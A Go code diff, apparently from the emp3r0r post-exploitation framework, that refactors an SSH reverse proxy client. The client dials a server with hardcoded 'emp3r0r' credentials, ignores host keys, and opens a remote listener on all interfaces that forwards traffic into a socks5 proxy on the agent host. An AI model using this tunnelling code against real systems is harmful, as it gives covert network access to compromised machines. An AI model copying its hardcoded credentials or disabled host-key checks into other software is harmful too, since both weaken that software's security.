@@ -1,4 +1,4 @@
-package agent
+package tun
 
 import (
 	"context"
@@ -7,14 +7,12 @@ import (
 	"log"
 	"net"
 	"strconv"
+	"strings"
 	"time"
 
 	gliderssh "github.com/gliderlabs/ssh"
-	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"golang.org/x/crypto/ssh"
 )
-
-var ReverseConns = make(map[string]context.CancelFunc) // remember reverse proxies
 
 func SSHProxyServer(port string) (err error) {
 	log.Printf("starting ssh proxy server on port %s...", port)
@@ -45,22 +43,23 @@ func SSHProxyServer(port string) (err error) {
 
 // SSHProxyClient dial SSHProxyServer, start a reverse proxy
 // serverAddr format: 127.0.0.1:22
-func SSHProxyClient(serverAddr string, ctx context.Context, cancel context.CancelFunc) (err error) {
+func SSHProxyClient(serverAddr string, reverseConns *map[string]context.CancelFunc, ctx context.Context, cancel context.CancelFunc) (err error) {
 	// var hostKey ssh.PublicKey
 	config := &ssh.ClientConfig{
 		User: "emp3r0r",
 		Auth: []ssh.AuthMethod{
-			ssh.Password(OpSep),
+			ssh.Password("emp3r0r"),
 		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
-	// the port to connect to
-	p, err := strconv.Atoi(ProxyPort)
+
+	// calculate ProxyPort
+	serverPort, err := strconv.Atoi(strings.Split(serverAddr, ":")[1])
+	// this is the reverseProxyPort
 	if err != nil {
-		return fmt.Errorf("WTF? ProxyPort %s: %v", ProxyPort, err)
+		return fmt.Errorf("serverPort invalid: %v", err)
 	}
-	reverseProxyPort := p + 1
-	serverAddr = fmt.Sprintf("%s:%d", serverAddr, reverseProxyPort)
+	proxyPort := strconv.Itoa((serverPort - 1)) // reverseProxyPort = proxyPort + 1
 
 	// Dial your ssh server.
 	conn, err := ssh.Dial("tcp", serverAddr, config)
@@ -70,28 +69,16 @@ func SSHProxyClient(serverAddr string, ctx context.Context, cancel context.Cance
 	defer conn.Close()
 
 	// Request the remote side to open port 8080 on all interfaces.
-	l, err := conn.Listen("tcp", "0.0.0.0:"+ProxyPort)
+	l, err := conn.Listen("tcp", "0.0.0.0:"+proxyPort)
 	if err != nil {
 		return fmt.Errorf("unable to register tcp forward: %v", err)
 	}
 	defer l.Close()
 	defer cancel()
 
-	hasInternet := tun.HasInternetAccess()
-	isProxyOK := tun.IsProxyOK(AgentProxy)
-	if !hasInternet && !isProxyOK {
-		return fmt.Errorf("We dont have any internet to share")
-	}
-	for p, cancelfunc := range ReverseConns {
-		if serverAddr == p {
-			cancelfunc() // cancel existing connection
-		}
-	}
-	ReverseConns[serverAddr] = cancel // record this connection
-	toAddr := "127.0.0.1:" + ProxyPort
-	if !hasInternet {
-		toAddr = AgentProxy
-	}
+	reverseConnsList := *reverseConns
+	reverseConnsList[serverAddr] = cancel // record this connection
+	toAddr := "127.0.0.1:" + proxyPort
 
 	// forward to socks5
 	serveConn := func(clientConn net.Conn) {
